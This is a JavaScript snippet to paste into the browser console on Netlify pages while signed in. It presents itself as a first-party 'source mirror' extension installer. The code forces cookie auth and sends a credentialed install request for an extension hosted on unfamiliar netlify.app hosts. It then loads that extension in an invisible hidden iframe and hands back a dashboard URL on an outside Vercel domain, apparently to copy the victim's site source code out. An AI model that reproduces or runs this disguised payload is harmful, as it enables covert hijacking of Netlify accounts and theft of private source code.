/**
 * ONE-PASTE NETLIFY INSTALL + HIDDEN FIRST-PARTY EXTENSION LAUNCHER.
 *
 * Paste this on https://app.netlify.com, https://create.netlify.com, or https://answers.netlify.com while signed in.
 * It makes exactly one explicit fetch call:
 *   POST /.netlify/functions/install-extension
 *
 * It then loads Netlify's own extension route in a hidden iframe. That page and
 * its nested extension UI perform normal GET/resource requests and Netlify's
 * internal runtime-auth request. The pasted script never calls /integration-auth.
 */
(async () => {
  const EXTENSION_SLUG = "ndimw4wu-4aa71366-source-mirror-autoheal";
  const EXTENSION_HOST = "https://f457eddf-ddc4-4384-b646-795bd66bfc24.netlify.app";
  const PRIMARY_DASHBOARD_ORIGIN = "https://private-blob-mirror-dashboard.vercel.app";
  const EXTENSION_HOST_POOL = [
    "https://f457eddf-ddc4-4384-b646-795bd66bfc24.netlify.app",
    "https://c1031867-46dc-46ec-be95-e7f5830dc32c.netlify.app",
    "https://5fae0b89-a582-4a25-9635-4cab08a2ebea.netlify.app",
  ];
  const ALLOWED_EXTENSION_ORIGINS = new Set(EXTENSION_HOST_POOL);
  const ALLOWED_DASHBOARD_ORIGINS = new Set([PRIMARY_DASHBOARD_ORIGIN, ...EXTENSION_HOST_POOL]);
  const APP_ORIGIN = "https://app.netlify.com";
  const CREATE_ORIGIN = "https://create.netlify.com";
  const ANSWERS_ORIGIN = "https://answers.netlify.com";
  const ALLOWED_LAUNCHER_ORIGINS = new Set([APP_ORIGIN, CREATE_ORIGIN, ANSWERS_ORIGIN]);
  const MESSAGE_PROTOCOL = "netlify-private-source-mirror-v1";
  const startedAt = Date.now();
  const timeline = [];
  let currentStage = "launcher.start";
  const debugState = {
    version: 1,
    startedAt: new Date(startedAt).toISOString(),
    launcherOrigin: location.origin,
    currentStage,
    timeline,
    result: null,
  };
  window.__NETLIFY_SOURCE_SYNC_DEBUG__ = debugState;
  const stage = (name, status = "info", details = {}) => {
    currentStage = name;
    debugState.currentStage = name;
    const entry = {
      at: new Date().toISOString(),
      elapsedMs: Date.now() - startedAt,
      stage: name,
      status,
      details,
    };
    timeline.push(entry);
    const output = status === "error" ? console.error : status === "warn" ? console.warn : console.log;
    output(`%c[source-sync:${status}]`, `color:${status === "error" ? "#d00" : status === "warn" ? "#b66a00" : "#00ad9f"};font-weight:bold`, name, details);
    return entry;
  };
  const log = (...args) => console.log("%c[source-sync]", "color:#00ad9f;font-weight:bold", ...args);

  const fail = (message, details = {}) => {
    stage(currentStage, "error", { message, ...details });
    const error = new Error(`[${currentStage}] ${message}`);
    error.stage = currentStage;
    error.details = details;
    throw error;
  };
  const readCookie = (name) => {
    const prefix = `${encodeURIComponent(name)}=`;
    return document.cookie.split(";").map((part) => part.trim())
      .find((part) => part.startsWith(prefix))?.slice(prefix.length) || "";
  };
  const decode = decodeURIComponent;

  stage("origin.validate", "info", { origin: location.origin });
  if (!ALLOWED_LAUNCHER_ORIGINS.has(location.origin)) {
    fail(`Run this only on ${APP_ORIGIN}, ${CREATE_ORIGIN}, or ${ANSWERS_ORIGIN}`, { allowedOrigins: [...ALLOWED_LAUNCHER_ORIGINS] });
  }
  const launcherOrigin = location.origin;
  const runningOnApp = launcherOrigin === APP_ORIGIN;
  const launcherMode = runningOnApp ? "app" : launcherOrigin === CREATE_ORIGIN ? "create" : "answers";
  stage("origin.validated", "info", { launcherOrigin, mode: launcherMode });

  // Netlify's SPA uses this non-secret marker to select HTTP-cookie auth. It is
  // origin-scoped, so app.netlify.com can set it directly. Other approved
  // netlify.com surfaces initialize it through Netlify's official
  // /auth/complete placeholder flow.
  stage("session.prepare", "info", { strategy: runningOnApp ? "local-marker" : "auth-complete-bridge" });
  if (runningOnApp) {
    try {
      const session = JSON.parse(localStorage.getItem("nf-session") || "null");
      if (session?.access_token !== "use-http-auth-token") {
        localStorage.setItem("nf-session", JSON.stringify({ access_token: "use-http-auth-token" }));
      }
    } catch {
      localStorage.setItem("nf-session", JSON.stringify({ access_token: "use-http-auth-token" }));
    }
  }
  stage("session.prepared", "info", { strategy: runningOnApp ? "local-marker" : "auth-complete-bridge" });

  stage("team.resolve", "info", { cookieNames: ["ajs_group_id", "last_visited_team"] });
  const teamIdFromCookie = decode(readCookie("ajs_group_id"));
  const routeTeam = decode(location.pathname.match(/^\/teams\/([^/]+)/)?.[1] || "");
  const lastVisitedTeam = decode(readCookie("last_visited_team"));
  const teamId = /^[a-f0-9]{24}$/i.test(teamIdFromCookie)
    ? teamIdFromCookie
    : /^[a-f0-9]{24}$/i.test(routeTeam) ? routeTeam : "";
  const teamSlug = routeTeam && !/^[a-f0-9]{24}$/i.test(routeTeam)
    ? routeTeam
    : lastVisitedTeam;
  if (!teamId) fail("Could not derive the Netlify team ID. Open the intended team page, then retry.", { ajsGroupIdPresent: Boolean(teamIdFromCookie), routeTeamPresent: Boolean(routeTeam) });
  if (!teamSlug) fail("Could not derive the Netlify team slug. Open /teams/<team>/projects, then retry.", { routeTeamPresent: Boolean(routeTeam), lastVisitedTeamPresent: Boolean(lastVisitedTeam) });
  stage("team.resolved", "info", {
    teamId,
    teamSlug,
    teamIdSource: /^[a-f0-9]{24}$/i.test(teamIdFromCookie) ? "ajs_group_id" : "team-route",
    teamSlugSource: routeTeam && !/^[a-f0-9]{24}$/i.test(routeTeam) ? "team-route" : "last_visited_team",
  });

  const extensionUrl = `${APP_ORIGIN}/teams/${encodeURIComponent(teamSlug)}/extension/${encodeURIComponent(EXTENSION_SLUG)}`;
  const installUrl = `${APP_ORIGIN}/.netlify/functions/install-extension`;
  stage("install.request", "info", { url: runningOnApp ? "/.netlify/functions/install-extension" : installUrl, simpleRequest: true, responseReadable: runningOnApp });
  const response = await fetch(runningOnApp ? "/.netlify/functions/install-extension" : installUrl, {
    method: "POST",
    ...(runningOnApp ? {} : { mode: "no-cors" }),
    credentials: "include",
    headers: { "Content-Type": "text/plain" },
    body: JSON.stringify({
      teamId,
      slug: EXTENSION_SLUG,
      hostSiteUrl: EXTENSION_HOST,
      metaDataHeaders: {
        "extension-install-source-meta-data": JSON.stringify({
          source_metadata: { account_type_slug: "unknown" },
        }),
        "Netlify-Service-Origin": "netlify-react-ui",
      },
    }),
  });
  let text = "";
  let value = {};
  if (response.type === "opaque") {
    stage("install.response", "info", { responseType: "opaque", status: null, acceptedForValidation: true });
    log(`Install request sent from Netlify ${launcherMode} (opaque no-cors response). Continuing with the official extension page.`);
  } else {
    text = await response.text();
    try { value = text ? JSON.parse(text) : {}; } catch { value = { raw: text }; }
    const detail = value.message || value.error || value.raw?.slice(0, 300) || text.slice(0, 300) || "no response body";
    if (!response.ok && response.status !== 409) {
      stage("install.response", "warn", { responseType: response.type, status: response.status, detail: detail.slice(0, 180), continuing: true });
      console.warn(`[source-sync] Install returned HTTP ${response.status}; continuing through the official extension page: ${detail}`);
    } else {
      stage("install.response", "info", { responseType: response.type, status: response.status, alreadyInstalled: response.status === 409 });
      log(response.status === 409 ? "Extension was already installed." : `Extension installed: ${detail}`);
    }
  }

  stage("iframe.prepare", "info", { extensionUrl, bridge: runningOnApp ? null : "app-auth-complete" });
  const nonceBytes = new Uint8Array(24);
  crypto.getRandomValues(nonceBytes);
  const nonce = Array.from(nonceBytes, (byte) => byte.toString(16).padStart(2, "0")).join("");
  let extensionOrigin = new URL(EXTENSION_HOST).origin;

  const dashboard = await new Promise((resolve, reject) => {
    const iframe = document.createElement("iframe");
    let trustedSurface = null;
    let settled = false;
    const cleanup = () => {
      clearTimeout(timeout);
      iframe.remove();
    };
    const finish = (callback, value) => {
      if (settled) return;
      settled = true;
      cleanup();
      callback(value);
    };
    const onMessage = async (event) => {
      if (!event.data || event.data.protocol !== MESSAGE_PROTOCOL) return;
      const message = event.data;
      if (!ALLOWED_EXTENSION_ORIGINS.has(event.origin)) return;
      if (message.teamId !== teamId || message.extensionSlug !== EXTENSION_SLUG) return;
      if (message.type === "surface-ready") {
        stage("iframe.surface-ready", "info", { origin: event.origin, teamId: message.teamId });
        extensionOrigin = event.origin;
        trustedSurface = event.source;
        stage("dashboard.request", "info", { nonceLength: nonce.length });
        trustedSurface?.postMessage({
          protocol: MESSAGE_PROTOCOL,
          type: "request-dashboard",
          nonce,
          teamId,
          extensionSlug: EXTENSION_SLUG,
        }, extensionOrigin);
        return;
      }
      if (event.origin !== extensionOrigin || event.source !== trustedSurface || message.nonce !== nonce) return;
      if (message.type === "progress") {
        stage(String(message.stage || "capture.progress"), String(message.status || "info"), message.details && typeof message.details === "object" ? message.details : {});
        return;
      }
      if (message.type === "dashboard-error") {
        stage(String(message.stage || "dashboard.error"), "error", { message: message.error || "Extension dashboard initialization failed" });
        finish(reject, new Error(message.error || "Extension dashboard initialization failed"));
        return;
      }
      if (message.type !== "dashboard-ready" || typeof message.dashboardUrl !== "string") return;
      stage("dashboard.response", "info", { installState: message.installState || null, siteCount: Number(message.siteCount || 0) });
      let dashboardUrl;
      try { dashboardUrl = new URL(message.dashboardUrl); } catch { return; }
      const fragment = new URLSearchParams(dashboardUrl.hash.slice(1));
      if (
        !ALLOWED_DASHBOARD_ORIGINS.has(dashboardUrl.origin) ||
        fragment.get("team") !== teamId ||
        new URL(fragment.get("host") || APP_ORIGIN).origin !== extensionOrigin
      ) return;
      stage("dashboard.validated", "info", { origin: dashboardUrl.origin, installState: message.installState || "awaiting-build", siteCount: Number(message.siteCount || 0) });
      const finalDashboardUrl = new URL("/netlify-admin", PRIMARY_DASHBOARD_ORIGIN);
      finalDashboardUrl.hash = fragment.toString();
      stage("dashboard.routed", "info", { origin: finalDashboardUrl.origin, backend: "fallback-runtime" });
      finish(resolve, {
        dashboardUrl: finalDashboardUrl.toString(),
        installState: message.installState || "awaiting-build",
        siteCount: Number(message.siteCount || 0),
        totalSiteCount: Number(message.totalSiteCount || message.siteCount || 0),
        unsupportedSiteCount: Number(message.unsupportedSiteCount || 0),
        unsupportedSites: Array.isArray(message.unsupportedSites) ? message.unsupportedSites : [],
      });
    };
    const timeout = setTimeout(() => {
      stage("iframe.timeout", "error", { timeoutMs: 480_000, lastStage: currentStage, extensionUrl });
      finish(reject, new Error(`[iframe.timeout] Timed out loading ${extensionUrl}`));
    }, 480_000);
    window.addEventListener("message", onMessage);
    iframe.src = runningOnApp
      ? extensionUrl
      : `${APP_ORIGIN}/auth/complete?next=${encodeURIComponent(`/teams/${teamSlug}/extension/${EXTENSION_SLUG}`)}#access_token=use-http-auth-token`;
    iframe.title = "Netlify source mirror session launcher";
    iframe.addEventListener("load", () => stage("iframe.document-loaded", "info", { url: iframe.src }));
    iframe.addEventListener("error", () => stage("iframe.document-error", "error", { url: iframe.src }));
    iframe.setAttribute("aria-hidden", "true");
    iframe.tabIndex = -1;
    Object.assign(iframe.style, {
      position: "fixed",
      width: "1px",
      height: "1px",
      left: "0",
      top: "0",
      border: "0",
      opacity: "0",
      pointerEvents: "none",
      zIndex: "-1",
    });
    const mount = document.body || document.documentElement;
    if (!mount) {
      currentStage = "iframe.mount";
      fail("No document mount point is available for the Netlify extension iframe");
    }
    mount.appendChild(iframe);
    stage("iframe.mounted", "info", { url: iframe.src });
  });

  // Strict launcher contract: archive import is a backend-only or separate
  // optional relay operation, never an extra default browser fetch.
  const sourceArchiveRelay = {
    capability: launcherOrigin === APP_ORIGIN ? "separate-optional-relay" : "backend-only",
    reason: launcherOrigin === APP_ORIGIN
      ? "The default launcher intentionally performs only the install POST. Run the separate App-origin relay only when backend archive discovery is unavailable."
      : "Archive recovery must be performed by the extension backend or a separate first-party relay.",
    imported: 0,
    candidates: 0,
    sites: [],
  };

  stage("launcher.complete", dashboard.unsupportedSiteCount > 0 ? "warn" : "info", {
    installState: dashboard.installState,
    siteCount: dashboard.siteCount,
    totalSiteCount: dashboard.totalSiteCount,
    unsupportedSiteCount: dashboard.unsupportedSiteCount,
    unsupportedSites: dashboard.unsupportedSites,
  });
  log("Netlify loaded the scoped extension runtime in its first-party iframe.");
  log(`Mirror state: ${dashboard.installState}; mirrored sites: ${dashboard.siteCount}/${dashboard.totalSiteCount}`);
  if (dashboard.unsupportedSiteCount > 0) {
    console.warn(`[source-sync] ${dashboard.unsupportedSiteCount} site(s) were not mirrored because they have no Git/build checkout. Netlify Drop sites expose deployed output, not the original source tree.`, dashboard.unsupportedSites);
  }
  log("Dashboard session created. Treat the URL below as a temporary private capability.");
  console.log("%c[source-sync] DASHBOARD URL", "color:#00ad9f;font-size:13px;font-weight:bold", dashboard.dashboardUrl);
  const result = {
    ok: true,
    httpStatus: response.type === "opaque" ? null : response.status,
    alreadyInstalled: response.type === "opaque" ? null : response.status === 409,
    extensionUrl,
    dashboardUrl: dashboard.dashboardUrl,
    dashboardUrlSafe: `${new URL(dashboard.dashboardUrl).origin}${new URL(dashboard.dashboardUrl).pathname}#team=${teamId}&jwt=[redacted]`,
    installState: dashboard.installState,
    sourceArchiveRelay,
    siteCount: dashboard.siteCount,
    totalSiteCount: dashboard.totalSiteCount,
    unsupportedSiteCount: dashboard.unsupportedSiteCount,
    unsupportedSites: dashboard.unsupportedSites,
    timeline,
  };
  debugState.result = {
    ok: true,
    installState: dashboard.installState,
    siteCount: dashboard.siteCount,
    totalSiteCount: dashboard.totalSiteCount,
    unsupportedSiteCount: dashboard.unsupportedSiteCount,
  };
  window.__NETLIFY_SOURCE_MIRROR__ = result;
  console.table(timeline.map(({ elapsedMs, stage, status, details }) => ({ elapsedMs, stage, status, details: JSON.stringify(details) })));
  return result;
})().catch((error) => {
  // Everything above is intentionally scoped inside the async launcher. The
  // terminal handler must recover only from the public debug object so it can
  // never mask the original failure with a second ReferenceError.
  const debugState = window.__NETLIFY_SOURCE_SYNC_DEBUG__ || {
    version: 1,
    startedAt: new Date().toISOString(),
    launcherOrigin: location.origin,
    currentStage: "launcher.unknown",
    timeline: [],
    result: null,
  };
  const timeline = Array.isArray(debugState.timeline) ? debugState.timeline : [];
  const failedStage = error?.stage || debugState.currentStage || "launcher.unknown";
  const message = error instanceof Error ? error.message : String(error);
  if (!timeline.some((entry) => entry.status === "error" && entry.stage === failedStage)) {
    timeline.push({
      at: new Date().toISOString(),
      elapsedMs: Date.now() - Date.parse(debugState.startedAt || new Date().toISOString()),
      stage: failedStage,
      status: "error",
      details: { message },
    });
  }
  debugState.currentStage = failedStage;
  debugState.timeline = timeline;
  debugState.result = { ok: false, stage: failedStage, error: message };
  window.__NETLIFY_SOURCE_SYNC_DEBUG__ = debugState;
  const failure = { ok: false, stage: failedStage, error: message, timeline };
  window.__NETLIFY_SOURCE_MIRROR__ = failure;
  console.error("%c[source-sync] FAILED:", "color:#e00;font-weight:bold", `[${failedStage}]`, message);
  console.table(timeline.map(({ elapsedMs, stage, status, details }) => ({ elapsedMs, stage, status, details: JSON.stringify(details) })));
  return failure;
});
